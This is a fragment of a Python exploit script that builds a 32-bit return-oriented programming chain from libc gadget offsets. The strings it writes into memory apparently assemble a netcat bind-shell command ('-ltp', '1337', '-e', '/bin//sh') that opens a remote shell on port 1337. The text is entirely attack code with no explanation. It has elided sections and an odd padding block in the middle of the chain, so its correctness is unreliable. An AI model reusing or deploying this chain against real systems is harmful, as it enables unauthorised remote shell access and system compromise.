...
p = ""
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
...
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178035) # @ .data + 21
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "-ltp"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178039) # @ .data + 25
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "1337"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017803d) # @ .data + 29
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000328e0) # xor %eax,%eax | ret
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017803e) # @ .data + 30
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "-e//"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178042) # @ .data + 34
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "/bin"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178046) # @ .data + 38
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += "//sh"
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017804a) # @ .data + 42
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000328e0) # xor %eax,%eax | ret
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017804c) # @ .data + 44
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += pack("<I", libcbase + 0x00178020) # @ .data
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178050) # @ .data + 48
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += pack("<I", libcbase + 0x00178035) # @ .data + 21
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178054) # @ .data + 52
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
p += pack("<I", libcbase + 0x0017803e) # @ .data + 30
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178058) # @ .data + 56
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x000328e0) # xor %eax,%eax | ret
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x00178059) # @ .data + 57
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017805a) # @ .data + 58
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017805b) # @ .data + 59
p += pack("<I", 0x42424242) # padding
p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
p += pack("<I", libcbase + 0x000e0097) # pop %edx | pop %ecx | pop %ebx | ret
p += pack("<I", libcbase + 0x0017804c) # @ .data + 44
p += pack("<I", 0x42424242) # padding
p += "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
p += pack("<I", libcbase + 0x00001a9e) # pop %edx | ret
p += pack("<I", libcbase + 0x00178058) # @ .data + 56
p += pack("<I", libcbase + 0x000328e0) # xor %eax,%eax | ret
